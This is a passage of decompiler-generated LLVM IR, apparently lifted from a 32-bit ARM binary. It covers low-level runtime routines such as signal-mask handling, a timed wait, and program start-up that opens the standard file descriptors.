  %v3_134f4 = load i32, i32* @r4, align 4
  store i32 %v3_134f4, i32* %stack_var_-20, align 4
  %v6_134f4 = load i32, i32* @r5, align 4
  %v9_134f4 = load i32, i32* @r6, align 4
  %v16_134f4 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v2_134f8 = icmp eq i32 %arg1, 0
  %v2_134fc = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_134f8, label %dec_label_pc_13680, label %dec_label_pc_13514.preheader

dec_label_pc_13514.preheader:                     ; preds = %dec_label_pc_134f4
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_1351c17 = add i32 %v16_134f4, 124
  br label %dec_label_pc_1350c

dec_label_pc_1350c:                               ; preds = %dec_label_pc_13514.preheader, %dec_label_pc_1350c
  %v5_1351c18 = phi i32 [ %v5_1351c17, %dec_label_pc_13514.preheader ], [ %v5_1351c, %dec_label_pc_1350c ]
  %v2_13510 = add i32 %v5_1351c18, -136
  %v3_13510 = inttoptr i32 %v2_13510 to i32*
  store i32 0, i32* %v3_13510, align 4
  %v0_13514.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13514 = add i32 %v0_13514.pre, -1
  store i32 %v1_13514, i32* %r1.global-to-local, align 4
  %v6_13514 = icmp slt i32 %v1_13514, 0
  %v4_1351c = mul i32 %v1_13514, 4
  %v5_1351c = add i32 %v4_1351c, %v16_134f4
  br i1 %v6_13514, label %dec_label_pc_13524, label %dec_label_pc_1350c

dec_label_pc_13524:                               ; preds = %dec_label_pc_1350c
  %v2_13524 = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_13524, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_13534 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_13534, i32* %stack_var_-28, align 4
  %v0_1353c = call i32 @function_1278c()
  store i32 %v0_1353c, i32* %r0.global-to-local, align 4
  %v1_13540 = load i32, i32* @r5, align 4
  %v5_13544 = icmp slt i32 %v0_1353c, %v1_13540
  br i1 %v5_13544, label %dec_label_pc_13688, label %dec_label_pc_13548

dec_label_pc_13548:                               ; preds = %dec_label_pc_13524
  %v2_13548 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_13548, i32* @r4, align 4
  store i32 %v1_13540, i32* %r0.global-to-local, align 4
  store i32 %v2_13524, i32* %r1.global-to-local, align 4
  %v3_13558 = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_13558 = call i32 @function_10918(i32 %v1_13540, %_TYPEDEF_sigset_t* %v3_13558, i32 %v2_13548)
  store i32 %v4_13558, i32* %r0.global-to-local, align 4
  %v1_1355c = load i32, i32* @r5, align 4
  %v9_1355c = icmp eq i32 %v4_13558, %v1_1355c
  br i1 %v9_1355c, label %dec_label_pc_13564, label %dec_label_pc_13688

dec_label_pc_13564:                               ; preds = %dec_label_pc_13548
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_13548, i32* %r0.global-to-local, align 4
  %v2_1356c = call i32 @function_12768(i32 %v2_13548, i32 17)
  store i32 %v2_1356c, i32* %r0.global-to-local, align 4
  %v1_13570 = load i32, i32* @r5, align 4
  %v9_13570 = icmp eq i32 %v2_1356c, %v1_13570
  br i1 %v9_13570, label %dec_label_pc_13588.preheader, label %dec_label_pc_13564.dec_label_pc_13650_crit_edge

dec_label_pc_13564.dec_label_pc_13650_crit_edge:  ; preds = %dec_label_pc_13564
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_13650

dec_label_pc_13588.preheader:                     ; preds = %dec_label_pc_13564
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13580

dec_label_pc_13580:                               ; preds = %dec_label_pc_13588.preheader, %dec_label_pc_13580
  %v5_1359016 = phi i32 [ %v5_1351c17, %dec_label_pc_13588.preheader ], [ %v5_13590, %dec_label_pc_13580 ]
  %v2_13584 = add i32 %v5_1359016, -136
  %v3_13584 = inttoptr i32 %v2_13584 to i32*
  store i32 0, i32* %v3_13584, align 4
  %v0_13588.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13588 = add i32 %v0_13588.pre, -1
  store i32 %v1_13588, i32* %r1.global-to-local, align 4
  %v6_13588 = icmp slt i32 %v1_13588, 0
  %v4_13590 = mul i32 %v1_13588, 4
  %v5_13590 = add i32 %v4_13590, %v16_134f4
  br i1 %v6_13588, label %dec_label_pc_13598, label %dec_label_pc_13580

dec_label_pc_13598:                               ; preds = %dec_label_pc_13580
  store i32 %v2_13524, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_135a0 = call i32 @function_1278c()
  store i32 %v0_135a0, i32* %r0.global-to-local, align 4
  %v1_135a4 = icmp slt i32 %v0_135a0, 0
  br i1 %v1_135a4, label %dec_label_pc_13688, label %dec_label_pc_135ac

dec_label_pc_135ac:                               ; preds = %dec_label_pc_13598
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_135b8 = call i32 @function_13da0(i32 17, i32* null, i32 %v2_134fc)
  store i32 %v4_135b8, i32* %r0.global-to-local, align 4
  %v1_135bc = icmp slt i32 %v4_135b8, 0
  br i1 %v1_135bc, label %dec_label_pc_135c4, label %dec_label_pc_135ec

dec_label_pc_135c4:                               ; preds = %dec_label_pc_135ac
  %v0_135c4 = call i32 @function_10a18()
  store i32 %v2_13548, i32* %r1.global-to-local, align 4
  store i32 %v0_135c4, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_135d8 = inttoptr i32 %v0_135c4 to i32*
  %v2_135d8 = load i32, i32* %v1_135d8, align 4
  store i32 %v2_135d8, i32* @r4, align 4
  %v3_135dc = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_135dc = call i32 @function_10918(i32 2, %_TYPEDEF_sigset_t* %v3_135dc, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_135e4 = load i32, i32* @r4, align 4
  %v1_135e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_135e4 = inttoptr i32 %v1_135e4 to i32*
  store i32 %v0_135e4, i32* %v2_135e4, align 4
  %v17_13690.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1368c

dec_label_pc_135ec:                               ; preds = %dec_label_pc_135ac
  %v2_135ec = load i32, i32* %stack_var_-424, align 4
  %v7_135f0 = icmp eq i32 %v2_135ec, 1
  %v2_135f8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_135f8, i32* @r4, align 4
  br i1 %v7_135f0, label %dec_label_pc_13600, label %dec_label_pc_13634

dec_label_pc_13600:                               ; preds = %dec_label_pc_135ec
  store i32 %v2_135f8, i32* %r1.global-to-local, align 4
  store i32 %v2_135f8, i32* %r0.global-to-local, align 4
  %v2_13608 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_13608 = call i32 @function_13ff4(%timespec* %v2_13608, i32 %v2_135f8)
  store i32 %v3_13608, i32* %r0.global-to-local, align 4
  store i32 %v3_13608, i32* %r6.global-to-local, align 4
  %v0_13610 = call i32 @function_10a18()
  store i32 %v2_13548, i32* %r1.global-to-local, align 4
  store i32 %v0_13610, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_13624 = inttoptr i32 %v0_13610 to i32*
  %v2_13624 = load i32, i32* %v1_13624, align 4
  store i32 %v2_13624, i32* @r4, align 4
  %v3_13628 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_13628 = call i32 @function_10918(i32 2, %_TYPEDEF_sigset_t* %v3_13628, i32 0)
  store i32 %v4_13628, i32* %r0.global-to-local, align 4
  %v0_1362c = load i32, i32* @r4, align 4
  %v1_1362c = load i32, i32* %r5.global-to-local, align 4
  %v2_1362c = inttoptr i32 %v1_1362c to i32*
  store i32 %v0_1362c, i32* %v2_1362c, align 4
  %v0_1365c.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1365c

dec_label_pc_13634:                               ; preds = %dec_label_pc_135ec
  store i32 %v2_13548, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_13640 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_13640 = call i32 @function_10918(i32 2, %_TYPEDEF_sigset_t* %v3_13640, i32 0)
  store i32 %v4_13640, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13650

dec_label_pc_13650:                               ; preds = %dec_label_pc_13564.dec_label_pc_13650_crit_edge, %dec_label_pc_13634
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_13564.dec_label_pc_13650_crit_edge ], [ %v2_135f8, %dec_label_pc_13634 ]
  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_13654 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_13654 = call i32 @function_13ff4(%timespec* %v2_13654, i32 %storemerge.pre-phi)
  store i32 %v3_13654, i32* %r0.global-to-local, align 4
  store i32 %v3_13654, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1365c

dec_label_pc_1365c:                               ; preds = %dec_label_pc_13600, %dec_label_pc_13650
  %v0_1365c = phi i32 [ %v0_1365c.pr, %dec_label_pc_13600 ], [ %v3_13654, %dec_label_pc_13650 ]
  %v2_1365c = icmp eq i32 %v0_1365c, 0
  br i1 %v2_1365c, label %dec_label_pc_13680, label %dec_label_pc_13664

dec_label_pc_13664:                               ; preds = %dec_label_pc_1365c
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_1366c = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_1366c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1368c

dec_label_pc_13680:                               ; preds = %dec_label_pc_134f4, %dec_label_pc_1365c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1368c

dec_label_pc_13688:                               ; preds = %dec_label_pc_13548, %dec_label_pc_13598, %dec_label_pc_13524
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1368c

dec_label_pc_1368c:                               ; preds = %dec_label_pc_13664, %dec_label_pc_13680, %dec_label_pc_135c4, %dec_label_pc_13688
  %v17_13690 = phi i32 [ %v3_1366c, %dec_label_pc_13664 ], [ 0, %dec_label_pc_13680 ], [ %v17_13690.pre, %dec_label_pc_135c4 ], [ -1, %dec_label_pc_13688 ]
  %v2_13690 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13690, i32* @r4, align 4
  store i32 %v6_134f4, i32* @r5, align 4
  store i32 %v9_134f4, i32* @r6, align 4
  ret i32 %v17_13690

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_135f8, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_13588, { 0, 2, 1 }
  uselistorder i32 %v2_13548, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_13540, { 1, 0, 2 }
  uselistorder i32 %v1_13514, { 0, 2, 1 }
  uselistorder i32 %v16_134f4, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 8, 9, 10, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 0, 7, 6, 9, 8, 22, 10, 12, 13, 11, 15, 14, 16, 18, 17, 20, 19, 21, 1 }
  uselistorder i32 (i32, i32*, i32)* @function_13da0, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @function_12768, { 1, 0 }
  uselistorder i32 ()* @function_1278c, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_1368c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_13688, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13680, { 1, 0 }
  uselistorder label %dec_label_pc_1365c, { 1, 0 }
  uselistorder label %dec_label_pc_13650, { 1, 0 }
  uselistorder label %dec_label_pc_13580, { 1, 0 }
  uselistorder label %dec_label_pc_1350c, { 1, 0 }
}

define i32 @function_13698(i32 %arg1) local_unnamed_addr {
dec_label_pc_13698:
  %r2.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 150
  br i1 %tmp, label %bb, label %dec_label_pc_13908

bb:                                               ; preds = %dec_label_pc_13698
  %v7_136a0 = mul i32 %arg1, 4
  %v8_136a0 = add i32 %v7_136a0, ptrtoint (i32* @global_var_136a8.359 to i32)
  %v9_136a0 = inttoptr i32 %v8_136a0 to i32*
  %v10_136a0 = load i32, i32* %v9_136a0, align 4
  call void @__pseudo_branch(i32 %v10_136a0)
  br label %dec_label_pc_13908

dec_label_pc_13908:                               ; preds = %bb, %dec_label_pc_13698
  %v0_13908 = call i32 @function_10a18()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_13914 = inttoptr i32 %v0_13908 to i32*
  store i32 22, i32* %v2_13914, align 4
  %v0_13a30 = load i32, i32* %r2.global-to-local, align 4
  ret i32 %v0_13a30

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_13a48(i32 %arg1) local_unnamed_addr {
dec_label_pc_13a74:
  %stack_var_-8 = alloca i32, align 4
  %v3_13a48 = load i32, i32* @r4, align 4
  store i32 %v3_13a48, i32* %stack_var_-8, align 4
  %v2_13a78 = load i32, i32* @global_var_26634.368, align 4
  %v2_13a7c = icmp eq i32 %v2_13a78, 0
  br i1 %v2_13a7c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_13a74
  call void @__pseudo_branch(i32 %v2_13a78)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13a74, %bb
  %v2_13a8c = load i32, i32* @global_var_26638.370, align 4
  %v2_13a90 = icmp eq i32 %v2_13a8c, 0
  br i1 %v2_13a90, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_13a94 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_13a94, i32* @r4, align 4
  %v9_13a94 = load i32, i32* @r0, align 4
  ret i32 %v9_13a94

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_13a8c)
  %v2_13aa0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13aa0, i32* @r4, align 4
  %v8_13aa0 = load i32, i32* @r0, align 4
  ret i32 %v8_13aa0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_13ab4() local_unnamed_addr {
dec_label_pc_13ab4:
  ret i32 0
}

define i32 @function_13abc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_13abc:
  %v1_13abc = load i32, i32* @r0, align 4
  ret i32 %v1_13abc
}

define i32 @function_13ac0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13ac0:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13ac0 = load i32, i32* @r4, align 4
  store i32 %v3_13ac0, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_13ad0 = call i32 @function_10560(i32 %arg1, i32 1)
  %v7_13ad4 = icmp eq i32 %v2_13ad0, -1
  br i1 %v7_13ad4, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_13ac0
  %v3_13ad8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_13ad8, i32* @r4, align 4
  ret i32 %v2_13ad0

bb4:                                              ; preds = %dec_label_pc_13ac0
  %v0_13adc = load i32, i32* @r4, align 4
  %v4_13ae4 = call i32 @function_107f8(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18190.373, i32 0, i32 0), i32 %v0_13adc)
  %v1_13ae8 = load i32, i32* %r5.global-to-local, align 4
  %v9_13ae8 = icmp eq i32 %v4_13ae4, %v1_13ae8
  br i1 %v9_13ae8, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_13aec = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_13aec, i32* @r4, align 4
  ret i32 %v4_13ae4

bb6:                                              ; preds = %bb4
  %v0_13af0 = call i32 @function_12bd4()
  %v0_13af4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13af4, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_13af0

; uselistorder directives
  uselistorder i32 %v2_13ad0, { 1, 0 }
  uselistorder i32 ()* @function_12bd4, { 0, 2, 1, 3 }
  uselistorder i32 (i8*, i32)* @function_107f8, { 4, 0, 1, 2, 3 }
  uselistorder i32 (i32, i32)* @function_10560, { 0, 2, 1, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_13af8(i32 %arg1) local_unnamed_addr {
dec_label_pc_13af8:
  %v2_13afc = load i32, i32* @global_var_2663c.375, align 4
  %v2_13b00 = icmp eq i32 %v2_13afc, 0
  br i1 %v2_13b00, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_13af8
  %v6_13b0c = load i32, i32* @r0, align 4
  ret i32 %v6_13b0c

bb3:                                              ; preds = %dec_label_pc_13af8
  store i32 1, i32* @global_var_2663c.375, align 4
  store i32 4096, i32* @global_var_26630.305, align 4
  %v0_13b40 = call i32 @function_10b14()
  ret i32 %v0_13b40
}

define i32 @function_13b54(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_13b54:
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_13b58 = mul i32 %arg2, 4
  %v5_13b58 = add i32 %tmp, %v4_13b58
  %v2_13b5c = load i32, i32* %arg3, align 4
  %v2_13b60 = ptrtoint i32* %stack_var_-120 to i32
  %v1_13b64 = add i32 %v5_13b58, 4
  %v9_13b68 = icmp eq i32 %v1_13b64, %v2_13b5c
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg7, i32* @global_var_26628.381, align 4
  store i32 %v1_13b64, i32* @global_var_2662c.357, align 4
  store i32 %arg6, i32* @global_var_26638.370, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_13b68, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_13b54
  store i32 %v5_13b58, i32* @global_var_2662c.357, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_13b54, %bb
  store i32 %arg4, i32* @r7, align 4
  %v2_13ba8 = bitcast i32* %stack_var_-120 to i8*
  %v3_13ba8 = call i32 @function_11d70(i8* %v2_13ba8, i32 0)
  %storemerge.pre = load i32, i32* @global_var_2662c.357, align 4
  br label %dec_label_pc_13bb8

dec_label_pc_13bb8:                               ; preds = %dec_label_pc_13bb8, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_13bb8, %dec_label_pc_13bb8 ]
  %v1_13bb8 = inttoptr i32 %storemerge to i32*
  %v2_13bb8 = load i32, i32* %v1_13bb8, align 4
  %v4_13bb8 = add i32 %storemerge, 4
  %v2_13bbc = icmp eq i32 %v2_13bb8, 0
  br i1 %v2_13bbc, label %dec_label_pc_13bc8, label %dec_label_pc_13bb8

dec_label_pc_13bc8:                               ; preds = %dec_label_pc_13bb8
  store i32 %v4_13bb8, i32* @r4, align 4
  %v1_13be822 = inttoptr i32 %v4_13bb8 to i32*
  %v2_13be823 = load i32, i32* %v1_13be822, align 4
  %v2_13bec25 = icmp eq i32 %v2_13be823, 0
  br i1 %v2_13bec25, label %dec_label_pc_13bf4, label %dec_label_pc_13bd0

dec_label_pc_13bd0:                               ; preds = %dec_label_pc_13bc8, %dec_label_pc_13be8
  %v5_13bd4 = phi i32 [ %v2_13be8, %dec_label_pc_13be8 ], [ %v2_13be823, %dec_label_pc_13bc8 ]
  %v2_13bd0 = icmp ugt i32 %v5_13bd4, 13
  %v7_13bd0 = icmp eq i32 %v5_13bd4, 14
  %v2_13bd4 = xor i1 %v2_13bd0, true
  %v3_13bd4 = or i1 %v7_13bd0, %v2_13bd4
  br i1 %v3_13bd4, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_13bd0
  %v6_13bd4 = and i32 %v5_13bd4, 536870912
  %v7_13bd4 = icmp ne i32 %v6_13bd4, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_13bd0, %bb42
  %v1_13be0 = phi i1 [ %v2_13bd0, %dec_label_pc_13bd0 ], [ %v7_13bd4, %bb42 ]
  %v2_13bd8 = xor i1 %v1_13be0, true
  %v3_13bd8 = or i1 %v7_13bd0, %v2_13bd8
  br i1 %v3_13bd8, label %bb44, label %dec_label_pc_13be8

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_13be8

dec_label_pc_13be8:                               ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_13bd8, i32 ptrtoint ([3 x i8]* @global_var_11d60.384 to i32))
  %v0_13be4 = load i32, i32* @r4, align 4
  %v1_13be4 = add i32 %v0_13be4, 8
  store i32 %v1_13be4, i32* @r4, align 4
  %v1_13be8 = inttoptr i32 %v1_13be4 to i32*
  %v2_13be8 = load i32, i32* %v1_13be8, align 4
  %v2_13bec = icmp eq i32 %v2_13be8, 0
  br i1 %v2_13bec, label %dec_label_pc_13bf4, label %dec_label_pc_13bd0

dec_label_pc_13bf4:                               ; preds = %dec_label_pc_13be8, %dec_label_pc_13bc8
  %v1_13bf8 = call i32 @function_156f8(i32 %v2_13b60)
  store i32 %v1_13bf8, i32* @r0, align 4
  %v1_13bfc = call i32 @function_13af8(i32 %v1_13bf8)
  store i32 %v1_13bfc, i32* @r0, align 4
  %v2_13c08 = icmp eq i32 %tmp37, 0
  br i1 %v2_13c08, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_13bf4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_13bf4, %bb45
  %v0_13c18 = phi i32 [ %tmp37, %dec_label_pc_13bf4 ], [ 4096, %bb45 ]
  %v3_13c10 = icmp eq i32 %tmp36, -1
  %v8_13c10 = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_26630.305 to i32), i32* @r2, align 4
  store i32 %v0_13c18, i32* @global_var_26630.305, align 4
  br i1 %v3_13c10, label %dec_label_pc_13c20, label %dec_label_pc_13c48

dec_label_pc_13c20:                               ; preds = %bb46
  %v0_13c20 = call i32 @function_13fc8()
  store i32 %v0_13c20, i32* @r0, align 4
  store i32 %v0_13c20, i32* @r4, align 4
  %v0_13c28 = call i32 @function_13f58()
  %v0_13c2c = load i32, i32* @r4, align 4
  %v9_13c2c = icmp eq i32 %v0_13c2c, %v0_13c28
  br i1 %v9_13c2c, label %dec_label_pc_13c34, label %dec_label_pc_13c70

dec_label_pc_13c34:                               ; preds = %dec_label_pc_13c20
  %v1_13c34 = call i32 @function_13f84(i32 %v0_13c28)
  store i32 %v1_13c34, i32* @r0, align 4
  store i32 %v1_13c34, i32* @r4, align 4
  %v0_13c3c = call i32 @function_13f2c()
  %v0_13c40 = load i32, i32* @r4, align 4
  %v9_13c40 = icmp eq i32 %v0_13c40, %v0_13c3c
  br i1 %v9_13c40, label %dec_label_pc_13c48, label %dec_label_pc_13c70

dec_label_pc_13c48:                               ; preds = %dec_label_pc_13c34, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_13c10, label %dec_label_pc_13cdc, label %dec_label_pc_13c54

dec_label_pc_13c54:                               ; preds = %dec_label_pc_13c48
  %v9_13c58 = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_13c58, label %dec_label_pc_13c60, label %dec_label_pc_13c70

dec_label_pc_13c60:                               ; preds = %dec_label_pc_13c54
  br label %dec_label_pc_13c70

dec_label_pc_13c70:                               ; preds = %dec_label_pc_13c60, %dec_label_pc_13c54, %dec_label_pc_13c34, %dec_label_pc_13c20
  %v2_13c78 = call i32 @function_13ac0(i32 0, i32 32768)
  %v2_13c84 = call i32 @function_13ac0(i32 1, i32 32770)
  %v2_13c90 = call i32 @function_13ac0(i32 2, i32 32770)
  br label %dec_label_pc_13cdc

dec_label_pc_13cdc:                               ; preds = %dec_label_pc_13c70, %dec_label_pc_13c48
  %v0_13ca0 = load i32, i32* @r6, align 4
  %v1_13ca0 = inttoptr i32 %v0_13ca0 to i32*
  %v2_13ca0 = load i32, i32* %v1_13ca0, align 4
  store i32 %v2_13ca0, i32* bitcast (i32** @global_var_205ac.391 to i32*), align 4
  store i32 %arg5, i32* @global_var_26634.368, align 4
  %v2_13cdc = icmp eq i32 %arg4, 0
  br i1 %v2_13cdc, label %dec_label_pc_13d18, label %bb47

bb47:                                             ; preds = %dec_label_pc_13cdc
  br label %dec_label_pc_13d18

dec_label_pc_13d18:                               ; preds = %dec_label_pc_13cdc, %bb47
  call void @__pseudo_branch(i32 %arg4)
  store i32 0, i32* @r5, align 4
  %v1_13d28 = call i32 @function_10a18()
  %v2_13d30 = inttoptr i32 %v1_13d28 to i32*
  store i32 0, i32* %v2_13d30, align 4
  %v0_13d5c = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_13d68 = call i32 @function_133cc(i32 %v0_13d5c)
  ret i32 %v1_13d68

; uselistorder directives
  uselistorder i32 %v2_13be8, { 1, 0 }
  uselistorder i32 %v1_13be4, { 1, 0 }
  uselistorder i1 %v2_13bd0, { 1, 0 }
  uselistorder i32 %v4_13bb8, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @function_133cc, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_13ac0, { 2, 1, 0 }
  uselistorder i32 14, { 1, 0 }
  uselistorder i32 13, { 1, 2, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13d18, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_13be8, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_13bd0, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @function_13da0(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13da0:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_13da0 = load i32, i32* @r4, align 4
  %v6_13da0 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_13da4 = icmp eq i32* %arg2, null
  %v2_13da8 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_13da4, label %dec_label_pc_13e14, label %dec_label_pc_13db8

dec_label_pc_13db8:                               ; preds = %dec_label_pc_13da0
  %v2_13dbc = load i32, i32* %arg2, align 4
  %v4_13dbc = add i32 %tmp, 4
  store i32 %v4_13dbc, i32* @r1, align 4
  %v2_13dc0 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_13dc0, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_13dbc, i32* %stack_var_-156, align 4
  %v0_13dcc = call i32 @function_11d60()
  store i32 %v0_13dcc, i32* %r0.global-to-local, align 4
  %v0_13dd0 = load i32, i32* @r4, align 4
  %v1_13dd0 = add i32 %v0_13dd0, 132
  %v2_13dd0 = inttoptr i32 %v1_13dd0 to i32*
  %v3_13dd0 = load i32, i32* %v2_13dd0, align 4
  %v1_13dd4 = and i32 %v3_13dd0, 67108864
  %v2_13dd4 = icmp eq i32 %v1_13dd4, 0
  br i1 %v2_13dd4, label %dec_label_pc_13de8, label %bb

bb:                                               ; preds = %dec_label_pc_13db8
  br label %dec_label_pc_13e04

dec_label_pc_13de8:                               ; preds = %dec_label_pc_13db8
  %v1_13df0 = and i32 %v3_13dd0, 4
  %v2_13df0 = icmp eq i32 %v1_13df0, 0
  br i1 %v2_13df0, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_13de8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_13de8, %bb20
  br label %dec_label_pc_13e04

dec_label_pc_13e04:                               ; preds = %bb, %bb21
  %v2_13e04 = icmp eq i32 %v0_13dd0, 0
  %v3_13e08 = ptrtoint i32* %stack_var_-156 to i32
  %.v3_13e08 = select i1 %v2_13e04, i32 0, i32 %v3_13e08
  %v0_13e14.pre = load i32, i32* @r5, align 4
  %v0_13e24.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13e14

dec_label_pc_13e14:                               ; preds = %dec_label_pc_13e04, %dec_label_pc_13da0
  %v0_13e24 = phi i32 [ %arg1, %dec_label_pc_13da0 ], [ %v0_13e24.pre, %dec_label_pc_13e04 ]
